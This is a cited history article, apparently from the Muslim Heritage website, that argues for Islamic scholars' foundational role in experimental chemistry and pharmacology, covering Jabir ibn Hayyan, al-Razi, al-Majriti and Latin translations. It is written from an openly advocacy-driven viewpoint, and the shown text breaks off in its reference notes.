{"text": "The Advent of Scientific Chemistry | Muslim Heritage\nUntil recently, the mainstream history of scientific ideas has failed to acknowledge numerous Islamic scientists and their great efforts and achievements throughout the centuries. This short article seeks to contribute in redressing this injustice by highlighting Muslim contributions and attitudes towards the progress of chemistry.\nSalim T S Al-Hassani* and Mohammed Abattouy**\nFigure 1: 15th-century European portrait of \"Geber\", the Latin name of Jabir ibn Hayyan: in Codici Ashburnhamiani 1166, Biblioteca Medicea Laurenziana, Florence (image in the public domain).\nBefore addressing the main subject of this article, an important remark needs to be made. It concerns the etymology and the root of the word \"alchemy\". The use of this word is a representative big corruption of science on the part of scholars, including Muslim-Arabic speaking scholars. The source of the corruption is two fold: linguistic and anti Muslim bias.\nAs far as the linguistic source goes, alchemy is just a bastard traduction of the Arabic word kimmiy (meaning quantity, and from which was derived al-kmiya used to designate the science of chemistry,) preceded by the article \"al\" (which means the article \"the\"), and which the Arabs always use (like the French and others for that matter). Only Barron Carra de Vaux had had the presence of mind to pointing to this, however briefly [1]. The article \"al\" does not exist with respect to other sciences because as an instance Al-Tib (Arabic for medicine) is not the word we call medicine today, or Al-Riyadhiyat the word we use for mathematics. Somehow al-kmia should be translated literally as The Chemistry and not Alchemy; in French \"la chimie\" and not l'alchimie. The fact that only Westerners translated or dealt with the subject, followed by rather shy Muslim scholars, the bastardised word of alchemy has remained, and has become the norm.\nFigure 2: Chemical apparatus depicted in two pages of the Alchemiae Gebri Arabis philosophi solertissimi libri (Bern, 1545). (Source).\nThe second reason, due to anti Muslim bias, explains why alchemy is still used instead of chemistry. The object of those with anti Muslim bias is to use scholarly methods, techniques and arguments, the open and the subtle. Here, the aim of these scholars is to avoid by all means making scientific and experimental chemistry a Muslim science. Chemistry is fundamentally based on experimentation with substances, turning one substance or matter into another by means of experimentation and laboratory work. This has been mainly the work of Muslims, and Muslims alone. Whilst the Greeks championed speculation and metaphysical analysis about chemical processes, the Muslims relied on experimentation. Such an approach was championed very early in particular by Al-Razi, who may be considered consequently the father of modern chemistry. And it is the Muslims who laid the foundations of this science as it will be shown in the following. Rather than admit that, or because of that, the scholars not familiar with Arabic scientific literature or holding prejudices in conceiving the progress of scientific ideas in history continue to use the word alchemy to refer to the Arabic chemical tradition, whilst it should be Chemistry. The consequence of both approaches leds, somehow, to lock the Muslim science into the corner of alchemy, which is mostly connected with cranks and frauds of all sorts and occult practices. In this context, only Western modern scientists such as Lavoisier, Berthelot and other scholars deserve to be called the chemists.\nFigure 3: Front cover of the first volume of the Corpus Alchemicum Arabicum, the Book of the Explanation of the Symbols (Kitab Hall Ar-Rumuz) by Muhammad Ibn Umail (Living Human Heritage Publications, Daimon Verlag, 2002).\nThus, it is hoped that Muslims, first, honest scholars, second, and then, those hostile to Islam, maybe, should start using the real word: Chemistry in connection with the large corpus produced within the scientific tradition of Islam on chemical processes, practices and chemical industry.\nGreek alchemy and Islamic chemistry\nWhilst relying on the Greek works to acquire their early notions in this subject, Muslim scientists soon realised the shortcomings of the Greek heritage in the field of chemistry. Indeed, although the Greek contribution to science served as the foundation of so much to build upon, its major weakness for instance was the Greek's reliance on abstract speculation to deal with chemical phenomena. This exercise was stimulating intellectually and to philosophical argumentation, but it hardly led to a quantitative study of chemical transformations. Thus, in the field of chemistry, soon after coming across the Greek output, the scholars of the Islamic lands decided to build a new and experimental science. In doing so, some of them continued using the old terminology and pursued the ancient aims, such as the stone of wisdom which converts base metals into gold and the elixir of life that permits eternal health and youthfulness [2].'\nFigure 4: European depiction of Al-Razi in the Latin version of one of his treatises translated by Gerard of Cremona in between 1250-60. (Image in the public domain).\nTo say that there were no Muslim cranks who used chemistry and experimentation to come out with rather crooked, fanciful ideas and results is wrong. Ibn Sina and Ibn Khaldun, both, the rigorous scientists they were, hit, and hard at them. This rejection of doubtful practices, in fact, pursues the early Muslim tradition of rejecting anything that was doubtful in terms of hadiths, and always making sure facts were backed by evidence. Hence both Ibn Sina and Ibn Khaldun attacked the experimentalists who, for instance, sought to turn ordinary metals into precious ones, gold in particular. Ibn Sina, for instance, in The Book of Minerals, denounces the artisans who dye metals in order to give them the outside resemblance of silver and gold. He asserts that fabrication of silver and gold from other metals is \"practically impossible and unsustainable from a scientific and philosophical point of view\" [3]. Ibn Khaldun, for his part, denounces the frauds of those who apply on top of silver jewellery a thin layer of gold, and make other manipulations of metals. To Ibn Khaldun, the divine wisdom wanted gold and silver to be rare metals to guarantee profits and wealth. Their disproportionate growth would make transactions useless and would `run contrary to divine wisdom [4].'\nIn the little known, easily readable and succinct book The Civilisation of Islam [5], Jean Mathe summarises well the achievements of Muslim chemists [6]. They discovered alcohol, nitric and sulphuric acids, silver nitrate and potassium. They also determined the weight of many bodies and mastered the technique of sublimation, crystallization and distillation. Muslim chemistry also took many industrial uses, including tinctures and their applications in tanning and textiles; distillation of plants and of flowers, the making of perfumes and therapeutic pharmacy. The works of one amongst them, Jabir ibn Hayyan, which Mathe says reaches 2000 (obviously an over-estimated figure, related to some of the controversies regarding the persona of Jabir) were the bible of European chemists until Lavoisier in the 18th century [7].'\nAlthough scientists such as al-Kindi, especially in his criticism of Greek's `chemistry,' and Ibn Sina's, in his Kitab al-shifa (the book of healing), devote some interest to the subject, and although there were tens of other Muslims who were involved in the science, there were primarily three Muslim chemists, truly masters of their science. These were in the chronology of their lives: Jabir, Al-Razi and al-Majriti.\nFigure 5: Arabic manuscript held in the British Library showing the distillation process in a treatise of chemistry.  The British Library, London.\nSo much controversy surrounds the figure of Jabir ibn Hayyan (722-815). This controversy is well summarised by Dunlop [8]. It mainly evolves around the issue of whether Jabir and the Latin Geber are one and the same scholar. Surely, Geber was the Latin counterpart of Jabir. However, Dunlop considers that the 3000 thousand or so works attributed to Jabir by many, especially some Muslim scholars, are an exaggeration. It is very likely that someone other than him must have written a big part of such a large corpus, and in view of the rather dubious, even dangerous connections then between the so called science of alchemy and the mystic and even occult practices, the person(s) might have preferred to take some prudent steps, using the name of Jabir to cover themselves with his fame and authority. Moreover, that great encyclopaedia of Muslim scholarship up to the 10th century, al-Fihrist by Ibn al-Nadim had its own doubts [9]. And al-Fihrist's record is absolutely impeccable. Still, even if Jabir is the author of only some hundreds of such treatises, it remains undoubtful that achievements would be considerable. Al-Faruqis [10] offer a very good account of some of such achievements. Some of Jabir's writings include Al Khawass al-kabir (the Great Book of Chemical properties), al-Mawazin (Weights and measures), Al-Mizaj (Chemical combination), and Al-Asbagh (Dyes). On top of that, he built a precise scale which weighed items 6, 480 times smaller than the ratl (approximately 0,5 kg). Before John Dalton by ten centuries, he defined chemical combinations as a union of the elements together, in too small particles for the naked eye to see, without loss of character. In addition, he invented a kind of paper that resisted fire and an ink that could be read at night. Jabir's other achievements, gathered from various sources [11], led him to perfect chemical processes such as sublimation, liquefaction, purification, amalgamation, oxidation, crystallization, distillation, evaporation, and filtration, which are described in detail. He also identified many new products, including alkalines, acids, salts, paints and greases. He prepared sulphuric acid, nitro-hydrochloric acid (used to dissolve some metals), caustic soda and a multitude of salts such as sulphates, nitrates and potassium and sodium carbonates. Jabir's works with metals and salts subsequently helped develop foundry techniques and glazing processes for tiles and other ceramics [12]. However, instead of focusing on his purely scientific contribution to chemistry, many non Muslim scholars dealing with the \"alchemy\" literature [13], prefer to dwell on the rather tedious, obscure, and un-scientific aspects of his work (or that of the other Geber) which involves celestial influences, mystical uses of figures and symbols, and other fanciful and folkloric matters of Greek and ancient origins (which were the very causes for Ibn Sina's and Ibn Khaldun's attacks on certain aspects of this science,) and which contribute to attach to the Muslims un-scientific practices.\nAl-Razi the experimantal chemist\nSomeone these scholars do not refer to for very long is Al-Razi. He was a pure rationalist, no nonsense scientist, who only believed in experimentation and concrete evidence, and never refrained from demolishing all previous speculative and erroneous conclusions, and he did so in every science he touched upon. Al-Razi was born in Rayy in Iran (250-318 H/864-932). Before he left chemistry for medicine, where he became one of the leading authorities, and occupied eminent functions in Baghdad as physician, he was also the founding father of truly modern chemistry. Al-Razi eliminated the symbolic, occult aspects that plagued the so called alchemy, and set up the firm foundations of modern chemistry. He, most of all, set up the laboratory in the modern sense, designing, describing and using more than twenty instruments. Both Anawati and Hill provide a good account of Al-Razi's elaborate laboratory [14], the precursor of the modern laboratory, and of which many parts are still in use today (although Hill mentions that, Anawati, like many others, chooses to ignore this fact, however important it is) [15]. This crucial contribution to science had amongst other impacts the development of modern pharmacy. Hence, Abu al-Mansur al-Muwaffaq mentions for the first time some chemical facts to distinguish certain medicines [16].\nAl-Razi himself was interested in the medical uses of chemical compounds [17]. In his work Secret of Secrets, he made the very useful classification of natural substances, dividing them into earthly, vegetable and animal substances, to which he also added a number of artificially obtained ones such as lead oxide, caustic soda, and various alloys. He went further in the cataloguing and description of his experiments, describing first the materials he used, then the apparatus, and methods and conditions of his experiments [18]. In the Secret of Secrets, he describes in great detail such chemical processes which he performed, and which have their modern equivalent form of distillation, calcination, crystallisation etc [19].\nFigure 6: Cover of Journal of Chemical Education, September 1995, where H.S. El Khadem published an article on an ancient alchemy lost text reproduced in the Keys of Wisdom by Al-Tughra'i (12th century) [20].\nThe last Muslim chemist to deserve mention here is the Spanish Muslim court scientist al-Majriti (from Madrid) (950-1007). He was particularly noted for his work Rutbat Al-Hakim (The Rank of the Wise), which amongst other things gives formulae and instructions for purification of precious metals. It was collected and put together in the year 1009, two years after his death. In this work, Al-Majriti was also the first to prove the principle of conservation of mass, credited eight centuries later to the French Lavoisier [21].\nOf course Muslim chemistry, like other sciences was heavily translated into Latin, and also into local languages, which explains its spread to Europe. Many of the manuscripts translated have anonymous authors, though. Robert of Chester, a 12th century scholar, translated Liber de compositione alchemise. At about the same time, Hugh of Santalla made the earliest Latin translation of lawh azzabarjad (the Emerald table). It is, as per usual, the Italian, Gerard of Cremona, who made the more valuable translations. Amongst others, he translated Al-Razi's study and classification of salts and alums (sulphates) and the related operations in De aluminibus et salibus, whose Arabic original is preserved [22]. Through its various versions, this work had a decisive influence on subsequent operations in the West, more generally on mineralogy [23]. Still, back to those earlier stages, Alfred of Sareshel translated the part of Ibn Sina's Kitab al-Shiffa (the Book of Healing) that deals with chemistry. It is, however, in fairly recent times that Muslim chemistry received the greater attention from more Western scholars, starting with Berthelot in the late 19th century, followed by Holmyard, Kraus, and above all Ruska, who give the best and most comprehensive account of Muslim chemistry, much of which unfortunately is inaccessible to non German speakers [24].\nChemistry at the service of pharmacology\nIn connection with chemistry, a large interest was devoted to pharmacology, which deserves to be fully and thoroughly addressed on its own merits, and to much deserved greater lengths. In recent studies, this subject was examined in the context of Arabic chemistry. It was with this intermediary that several works of Muslim scholars were published and analyzed, such as al-Kindi's and al-Zahrawi's chemical investigation aiming at the creation of drugs [25].\nFigure 7: An illuminated opening from the alchemical treatise The Proof Regarding Secrets of the Science of the Balance (Kitab al-Burhan fi asrar 'ilm al-mizan) by 'Izz al-Din Aydamir al-Jildaki (d. 1342/743 H). Undated copy made in Morocco in the late 19th century. National Library of Medicine, Bethesda, MA, MS A7, part 1, fols. 1b-2a.  NLM. (Source).\nThe Muslims used in many ways the same methods, means and techniques in both chemistry and pharmacology to produce drugs. Through their experimental methods, they prepared products they used for healing including camphor, alum, ambergris etc. Under Islam, spread the profession of pharmacist, the first shops were opened in the early 9th century in Baghdad. Those shops had to abide by strict rules, regularly visited by a Muhtasib (inspector or market inspector) who applied corporal punishment on pharmacists who adulterated drugs.\nMuslim pharmacists were the first to write regular pharmacopoeia, i.e. the cataloguing and the listing of drugs. The technical term used by Muslims was Aqrabadin, a word of Greek origin meaning list or register. According to Levey, the Muslims were excellent organisers of knowledge, and so their pharmacological texts were directed carefully along the many directions which were either promising or useful to the apothecary and medical practitioner. These treatises as a result generally are more or less within well delineated groups. Some of the major types of Muslim pharmacological literature are given by Levey as follows [26]:\n1) Medical formularies which include many kinds of compound drugs, pills, pastilles, powders, syrups, oils, lotions, dentifrices, etc.\n2) Books on poisons.\n3) Synonymatic: treatises in which are found lists of simples usually in alphabetical order to help the reader to identify the drug in other languages.\n4) Tabular, synoptic texts, whereby long texts are turned into tabular work for quick usage, and abstracts made of some treatises for the same purpose.\n5) Lists of materia medica which include therapeutic considerations and opinions of various writers on the subject, preparations of the drugs and descriptions.\n6) Substitute drugs in case one drug for whatever reason was not available, a substitute was provided.\n7) Works on medical specialities available either as separate treatises or as sections of large encyclopaedias of medicine.\nFigure 8: Pharmacist preparing drugs. From a MS of the Arabic translation of Dioscorides' Materia Medica. (Source).\nThere is a large collection of works on the subject legated by Muslim scholars. Sabur Ibn Sahl (d 869) was the first physician to initiate pharmacopoeia, describing a large variety of drugs and remedies to ailments. In the 10th century, Abu Mansur Muwaffaq of Herat wrote The foundations of the true properties of Remedies, where he described 585 drugs [27]. Al-Biruni (d. 1051) wrote one of the most valuable Islamic works on pharmacology entitled Kitab al-Saydanah (The Book of Drugs), where he gave detailed knowledge of the properties of drugs and outlined the role of pharmacy and the functions and duties of the pharmacist. Ibn Sina, too, described no less than 700 preparations, their properties, mode of action and their indications. He devoted in fact a whole volume to simple drugs in his Canon [28]. It would seem, however, that it is the works by Massawayh al-Maridini of Baghdad and Cairo, and Ibn al-Wafid of Spain, that had the largest impact. Both were printed in Latin more than fifty times, appearing as De Medicinis universalibus et particularibus by Mesue the younger, and the Medicamentis simplicibus by Abenguefit [29]. Peter of Abano (1250-1316) translated and added a supplement to the work of al-Maridini under the title De Veneris, thus making the work of al-Maridini the standard reference work in the West for the next centuries [30]. Another later work to demonstrate the heavy dependence on Muslim pharmacology is by Jacques Sylvius (1487-1555) [31].\nIn the following concluding remarks we summarise the salient points focused upon in the article. Alchemy and chemistry in Islam refer to the study of both traditional alchemy and early practical chemistry by Muslim scientists. The modern word alchemy itself was derived from the Arabic word al-kimia and it should be properly be applied to design chemistry in the modern sense.\nThe study of alchemy and chemistry often overlapped in the early Islamic world, but later there were disputes between the traditional alchemists and the practical chemists who discredited alchemy. Muslim chemists were the first to employ the experimental scientific method (as practised in modern chemistry). Chemists such as Jabir ibn Hayyan (Latinized as Geber) and al-Razi (Latinized as Rhazes) contributed key chemical discoveries, including: invention of the distillation apparatus (such as the alembic, still, and retort) which were able to fully purify chemical substances; creation of the muriatic (hydrochloric), sulfuric, nitric and acetic acids; use of soda and potash; invention of procedures to produce distilled water and purified distilled alcohol; applying chemical transformation in the industry of perfumery; the discovery that aqua regia, a mixture of nitric and hydrochloric acids, could dissolve the noblest metal.\nBesides these outstanding inventions, many chemical substances and apparatus that shaped the history of chemical processes are of Islamic origin. The words elixir, alembic and alcohol are of Arabic origin. From the Arabic names of al-natrun and al-qaliy, Latinized into Natrium and Kalium, come the modern symbols for sodium and potassium.\nAn early experimental scientific method for chemistry began emerging among early Muslim chemists. Jabir Ibn Hayyan clearly recognized and proclaimed the importance of experimentation. He said in substance that the first essential in chemistry is that one should perform practical work and conduct experiments, for he who performs not practical work nor makes experiments will never attain the least degree of mastery.\nMuhammed Al-Razi was the first in his Al-Shukuk 'ala Jalinus (Doubts about Galen), was the first to prove both Aristotle's theory of classical elements and Galen's theory of humorism wrong using an experimental method. He carried out an experiment which would upset these theories by inserting a liquid with a different temperature into a body resulting in an increase or decrease of bodily heat, which resembled the temperature of that particular fluid. Al-Razi noted particularly that a warm drink would heat up the body to a degree much higher than its own natural temperature, thus the drink would trigger a response from the body, rather than transferring only its own warmth or coldness to it. Al-Razi's chemical experiments further suggested other qualities of matter, such as \"oiliness\" and \"sulfurousness\", or inflammability and salinity, which were not readily explained by the traditional fire, water, earth and air division of elements. Al-Razi was also the first to distill petroleum, to invent kerosene and kerosene lamps, to invent soap bars and modern recipes for soap, to produce antiseptics, and to invent numerous chemical processes such as sublimation.\nFrom the 12th century CE, the writings of chemical works of Jabir, al-Kindi, al-Razi and others became widely known in Europe during the Arabic-Latin translation movement and later through the Latin writings of a mysterious author known in the literature as \"Pseudo-Geber\", an anonymous alchemist born in 14th century Spain, who translated more of Jabir's books into Latin and wrote some of his own books under the pen name of \"Geber\".\nThe authors would like to acknowledge the assistance and contribution of the following colleagues in the production and providing documentation for this article: Ms Kathy Mathews, Dr Salah Zaimeche, Dr Salim Ayduz and the staff of Joules and John Rylands Libraries at Manchester University.\nAl-Hassan, A. Y.: online articles at History of Science and Technology in Islam:\nA Critical Reassessment of the Geber Problem: Part One: The Emergence of the Geber Problem: Berthelot's Assumptions; Part Two: Jabir (Geber)'s Standing in the Latin West And the Translator of the Liber fornacum;Part Three: Berthelot's Motives in Choosing the Wrong Arabic Alchemical Treatises and the Extant Arabic Works of Jabir on Theoretical and Practical Alchemy and Chemistry.\nThe Geber Problem: The Origin of Liber Fornacum.\nAlcohol and the Distillation of Wine.\nSal Nitri and Sal Petrae In Geber's Latin Works.\nPotassium Nitrates in Arabic and Latin Sources.\nJabir's Latin Works and the Question of Geber.\nEighth century treatise on glass: Kitab al-Durra al-Maknuna (The Book of the Hidden Pearl of Jabir ibn Hayyan (c. 721c. 815) On Coloured Glass, On Lustre, On Gemstones And Pearls: Part 1: The Manufacture of Coloured Glass; Part 2: Lustre Glass; Part 3: The Colouring Of Gemstones, The Purifying and Making of Pearls and Other Useful Recipes; Part 4: Assessment of Kitab al-Durra al-Maknuna.\nArabic Alchemy ('Ilm al-San'a): Science of the Art.\nAl-Hassan, Ahmad Yusuf (1987). \"Chemical Technology in Arabic Military Treatises. A Review of the Sources\". In: From Deferent to Equant. Edited by D.A. King and G. Saliba. New York: New York Academy of Science, pp. 153-166.\nAnawati, Georges (1996). \"Arabic Alchemy\". In: Encyclopaedia of the History of Arabic Science, edited by Roshdi Rashed. London: Routledge, pp. 853-885.\nArberry, A. J. (1950). The spiritual physick of Rhazes. London: J. Murray.\nBerthelot, M. (1893). La Chimie au Moyen Age. Vol. 3: L'Alchimie Arabe. Une introduction historique et les traits de Crats, d'El-Habib, d'Ostans et de Djber. Texts and translations. Paris: Imprimerie nationale. Reprinted Amsterdam, Philo Press. 1968.\nBerthelot, M. and Duval, R. (1967). La chimie au Moyen ge : comprenant une introduction et plusieurs traits d'Alchimie syriaques et arabes d'aprs les manuscrits du British Museum et de Cambridge. Osnabrck: Otto Zeller.\nBraccesco, G. (1562). La espositione di Geber filosofo. Vinegia: Appresso Gabriel Giolito de' Ferrari.\nBraccesco, G. and Bolton, H. C. (1548). De alchemia dialogi duo : quorum prior, genuinam librorum Gebri sententiam. Lugduni, Excudebant Godefridus & Marcellus Beringi fratres.\nCarra de Vaux, Bernard (1984). Les penseurs de l'Islam. 5 vols. Paris: Geunther, 1921-26. Vol. 2: Les Penseurs de l'Islam. 2: Les Gographes. Les sciences mathmatiques et naturelles. Lausanne: Roth-Hotz reprise.\nCorbin, Henri, Lory, Pierre (1986). L'Alchimie comme art hiratique : textes. Paris: L'Herne.\nHaq, Seyyed Numan (1994). Names, natures, and things : the Alchemist Jabir ibn Hayyan and his Kitab al-Ahjar (Book of Stones). Dordrecht/Boston: Kluwer.\nHashimi, M. h. Y. h. (1958). al-Imam al-Sadiq : mulhim al-kimiya. Cairo: Al-mu'assasa al-Suriya al-Iraqiya.\nHolmyard Eric John (1931). Makers of Chemistry. Oxford: Clarendon Press.\nHolmyard, E. J. (1957). Alchemy. The story of the fascination of gold and the attempts of chemists. Harmondsworth, Middle- sex: Penguin Books, 1957, reprint 1968.\nGeber and Darmstaedter, E. (1922). Die Alchemie des Geber, bers. und erklrt von Ernst Darmstaedter. Berlin: Springer. Reprinted Die Alchemie des Geber. Wiesbaden: M. Sndig, 1969.\nGeber, Khalid ibn Yazid al-Katib, Philaletha and Bolton, H. C. (1753). Geberi des Kniges der Araber, scharffinnigen Philosophi und wahren Adepti Curieuse vollstndige chymische Schriften : worinnen in den vier Bchern das Quecksilber, Schwesel, Arsenicum, Gold, Silber, Bley, Zinn, Kupfer, Eisen [etc]. Wienn: J. P. Krauss.\nGeber and Newman, W. R. (1991). The Summa perfectionis of Pseudo-Geber : A Critical edition, translation and study. Leiden/New York: E.J. Brill.\nJabir ibn Hayyan (1928). The Arabic Works of Jabir Ibn Hayyan. Paris: Paul Geuthner.\nJabir ibn Hayyan (1983). Dix traits d'alchimie : les dix premiers traits du Livre des soixante-dix. French translation by Pierre Lory. Paris: Sindbad.\nJabir ibn Hayyan (1986). Jabir ibn Hayyan (8th century): Kitab al-Sab'in. The Book of Seventy. Frankfurt: Institute for the History of Arabic-Islamic Sciences.\nIbn Umayl (2002). Ibn Umayl Abu `Abd Allah Muhammad (fl. c. 300/912) : texts and studies. Frankfurt: Institute for the History of Arabic-Islamic Sciences.\nJabir ibn Hayyan (1988). Tadbir al-iksir al-a'zam : arba' 'asharah risalah fi san'at al-kimiya. Edition of the Arabic text by Pierre Lory. Damascus: al-Ma'had al-'Ilmi al-Faransi li-'l-Dirasat al-'Arabiya.\nJabir b, Hayyan (1986). Kitab al-Sab'in. Frankfurt: Institute for the History of Arabic-Islamic Sciences.\nJabir ibn Hayyan (2002). Jabir b. Hayyan : Texts and Studies. Frankfurt: Institute for the History of Arabic-Islamic Sciences.\nKhalid, F. (1984). Khalid ibn Yazid, siratuhu wa-ihtimamatuhu al-'ilmiyya. Dirasa fi al-'ulum 'inda al-'arab. Baghdad: Wizarat al-thaqafa wa-al-I'i'lam.\nKopp, H. (1869). Beitrge zur Geschichte der Chemie. Braunschweig: F. Vieweg und sohn.\nKraus, Paul (1942). Jabir ibn Hayyan : contribution  l'historire des ides scientifiques dans l'Islam. Le Caire: Impr. de l'Institut franais d'archologie orientale. Reprinted: Kraus, Paul (1986). Jabir Ibn Hayyan : contribution  l'histoire des ides scientifiques dans l'Islam : Jabir et la science grecque. Paris: Les Belles Lettres.\nKraus, Paul (1935). Jabir Ibn Hayyan. Textes choisis. Paris and Cairo.\nKraus, P., Brague, R. (1994). Alchemie, Ketzerei, Apokryphen im frhen Islam : gesammelte Aufstze. Hildesheim: Georg Olms Verlag.\nKutbi, Z. (1996). Jabir ibn Hayyan. Damascus: Dar Talas.\nLiv, M. (1980). Al-Kmiy' wa-l-taknlyiy al-kmya'iyya f wd al-rfidn. Baghdad: Dr al-Hurriyya.\nLevey, Martin (1966). \"The Aqrabadhin of al-Kindi and Early Arabic Chemistry\", Chymia vol. 8.\nLevey, Martin (1962). \"Mediaeval Arabic Bookmaking and Its Relation to Early Chemistry and Pharmacology\". Transactions of the American Philosophical Society, vol. 52(4): 179.\nLevey, Martin (1973). Early Arabic Pharmacology: An Introduction Based on Ancient and Medieval Sources. Leiden: E. J. Brill.\nMahmud, Z. N. (1986). Jabir ibn Hayyan. Beirut: al-Markaz al-Arabi li-'l-thaqafa wa-al-'ulum. First edition1962.\nMarquet, Y. (1988). La philosophie des alchimistes et l'alchimie des philosophes : Jbir ibn Hayyn et les \"Frres de la Puret\". Paris: Maisonneuve et Larose.\nMartels, Z. R. W. M. v. (1990). Alchemy Revisited : Proceedings of the International Conference on the History of Alchemy at the University of Groningen, 17-19 April 1989. Leiden/New York: E.J. Brill.\nMeyerhoff, Max (1931). \"Science and Medicine\". In The Legacy of Islam, edited by Sir Thomas Arnold and A. Guillaume. Oxford University Press, pp. 311-55.\nMeyerhoff, Max (1935). \"Esquisse d'histoire de la pharmacologie et de la botanique chez les Musulmans d'Espagne,\" Al-Andalus vol. 3: pp. 1-41.\nNajib, H. (1991). R'id al-kmiy al-'arabiyah: Jabir ibn Hayyan. Abu Dhabi: Dar al-Mutanabbi.\nPlessner, M. and Klein-Franke, F. (1975). Vorsokratische Philosophie und griechische Alchemie in arabisch-lateinischer berlieferung : Studien zu Text und Inhalt der Turba philosophorum. Wiesbaden: F. Steiner.\nPrincipe, L. (2007). Chymists and chymistry : studies in the history of alchemy and early modern chemistry. Sagamore Beach, MA: Science History Publications.\nRazi, al-, Muhammad ibn Zakariya (1766). Rhazes de variolis et morbillis, arabice et latine; cvm aliis nonnvllis eivsdem argvmenti. Cvra et impensis Iohannis Channing. Londini, excvdebat Gvilielmvs Bowyer.\nRazi, al-, Muhammad ibn Zakariya (1964). Al-Asrar wa-sirr al-asrar. Tehran.\nRazi, al-, Muhammad ibn Zakariya (1964). Al-Sira al-Falsafiya. Tehran.\nRex, F. (1975). Zur Theorie der Naturprozesse in der Fr harabischen Wissenschaft : das Kitab al-Ihrag. bersetzt und Erklrt, ein Beitrag zum alchemistischen Weltbild der bir-schriften (8./10. Jahrhundert N.Chr.). Wiesbaden: Franz Steiner.\nRuska, Julius (1912). \"Al-Rasi (Rhases) als Chemiker\", Zeitschrift fur Angewandte Chemie vol. 35: pp. 719-24.\nRuska, Julius (1933). \"Die Alchemie des Avicenna,\" Isis vol. 21: pp. 14-51.\nRuska, Julius (1935). Das Buch der Alaune and salze. Berlin.\nRuska, J. (1935). \"Die Alchemie ar-Razi's\", Der Islam vol. 22,: pp. 281-319.\nRussell, Richard (1678). The works of Geber : the most famous Arabian prince and philosopher of the investigation and perfection of the philosophers-stone. London, Printed for William Cooper. Englished by R. Russel, 8. London: Printed for William Cooper. Reedited by E. J. Holyard. London, 1928.\nSalmon, W., Khalid ibn Yazid, Jabir ibn Hayyan, Artephius, Flamel, N., et al. (1692). Medicina practica, or, Practical physick: shewing the method of curing the most usual diseases happening to humane bodies... to which is added, the philosophick works of Hermes Trismegistus, Kalid Persicus, Geber Arabus, Artesius Longvus, Nicholas Flammel, Roger Bachon and George Ripley : all translated out of the best Latin editions into English. London: Printed for T. Howkins, J. Taylor and J. Harris.\nSezgin, F. (2001). Chemistry and Alchemy. Texts and Studies. Frankfurt: Institute for the History of Arabic-Islamic Sciences.\nSezgin, F. et al. (edit.) (2002). Jabir Ibn Hayyan. Texts and Studies. Collected and reprinted. Frankfurt: Institute for the History of Arabic-Islamic Sciences.\n[1] Barron Bernard Carra de Vaux, Les penseurs de l'Islam. 5 vols. Paris: Geunther, 1921-26. Vol. 2 is dedicated to sciences: Les Penseurs de l'Islam. 2: Les Gographes. Les sciences mathmatiques et naturelles. Lausanne: Roth-Hotz reprise, 1984, p. 374.\n[2] M. Ali Kettani. \"Science and Technology in Islam: The underlying value system\", in Z. Sardar ed., The Touch of Midas; Science, values, and environment in Islam and the West; Manchester University Press, 1984, pp 66-90; p. 77.\n[3] Georges Anawati, \"Arabic Alchemy\", in Encyclopaedia of the History of Arabic Science, edited by Roshdi Rashed, London: Routledge, 1996, vol. 3, pp. 853-85; at p. 877. One has to be careful of Anawati's article, though. Whilst Ibn Sina and Ibn Khaldun never attacked the science of chemistry and real scientists, but just the crooked versions of it, Anawati, like others, eagerly generalises and accuses them of attacking the science itself. There is absolutely in neither Ibn Sina's work, who was himself a chemist to large extent, and in Ibn Khaldun's, one single instance of attack on the science itself.\n[5] It must be signalled that we find some regrettable errors in the book, most of all poor naming of the Muslim scientists, possibly due to print cookies; for example writing al-Birani (for al-Biruni, p. 120), Ibn Batoutah (for Ibn Batouah, p. 125).\n[6] Jean Mathe, The Civilisation of Islam, tr. by David Macrae, Crescent Books, New York.\n[7] Ibid, pp. 123-24.\n[8] D.M. Dunlop, Arab Civilisation 800-1500 A.D., Longman Group, 1971, pp. 209-11.\n[9] Bayard Dodge, The Fihrist of al-Nadim. A Tenth Century Survey of Muslim Culture, Columbia Records of Civilisation: Sources and Studies, No. LXXXIII, 2 vols, New York and London, 1970. The Fihrist is an absolute must for anyone seeking to know about Muslim scholarship up to the 10th century. By then, already, Muslim scholars counted in the thousands. And this growth continued in subsequent centuries, until the 16th at least.\n[10] Ismail R. and Lois Ibsen Al Faruqi, The Cultural Atlas of Islam. New York: Macmillan, 1986, p. 238.\n[11] Most particularly from A. M. Kettani, \"Science\", op. cit., p. 78, and Carra de Vaux, Les Penseurs de l'Islam, op. cit.\n[12] G.M. Wickens, \"The Middle East as a world centre of science and medicine\", in R. M. Savory, Introduction to Islamic Civilization, pp. 111-118, Cambridge University Press, 1976, pp. 111-118; p. 113.\n[13] For instance, Georges Anawati, \"Arabic alchemy\", op. cit., at pp. 865-7; C. A. Ronan, \"The Arabian Science\", in The Cambridge Illustrated History of the World's Science, Cambridge University press/Newness Books, 1983, pp. 201-244; pp. 237-38.\n[14] G. Anawati, \"Arabic Alchemy\", op. cit, p. 868; D.R. Hill, Islamic Science and Engineering. Edinburgh: Edinburgh University Press, 1993, p. 84.\n[15] This fact is highly important, though, as it demonstrates how Muslim science is still valid in many respects today.\n[16] E.J. Holmyard, Alchemy, London, 1957, p. 88, quoted in G. Anawati, \"Arabic Alchemy\", op. cit., p. 869.\n[17] C. A. Ronan, \"The Arabian\", op. cit., p. 239.\n[18] M. Ali Kettani, \"science\", op. cit., p. 79.\n[19] S. Nasr, Science and Civilization in Islam. Cambridge (Mass.): Harvard University Press, 1968, pp. 269-78. Nasr gives a good outline of some of Al-Razi's experiments on metals, preparation of caustic soda, use of Mercury Ammonium Chloride Solution as a dissolving reagent etc.\n[20] H. S. El Khadem, \"A Lost Text By Zosimos Reproduced in an Old Alchemy Book\", Journal of Chemical Education, vol. 72, Issue 9. In this article, the author presents an Arabic translation of a text entitled Keys of Wisdom by the famous 4th-century alchemist Zosimos, which has been found in an alchemy book written by a 12th century Arabic writer named Al-Tughra'i.\n[21] M. Ali Kettani, \"Science\", op cit, p. 79.\n[22] J. Ruska, Das Buch der Alaune and salze, Berlin, 1935, mentioned in R. Halleux, \"The Reception of Arabic Alchemy in the West\", in Encyclopedia of the History of Arabic Science, London, 1996, vol. 3, pp. 886-902, at p. 892.\n[23] R. Halleux, \"The Reception\", op. cit., p. 892.\n[24] See for instance: M. Berthelot: Les Origines de l'Alchimie, Paris 1885, reprinted Paris, 1938; M. Berthelot: La Chimie au Moyen Age, III: l'Alchimie Arabe', texts and translations in collaboration with O. Houdas, Paris, 1893, reprinted Amsterdam, 1968; E.J. Holmyard, Alchemy, London, 1957; P. Kraus, Jabir Ibn Hayyan. Textes choisis, Paris, Cairo, 1935; J. 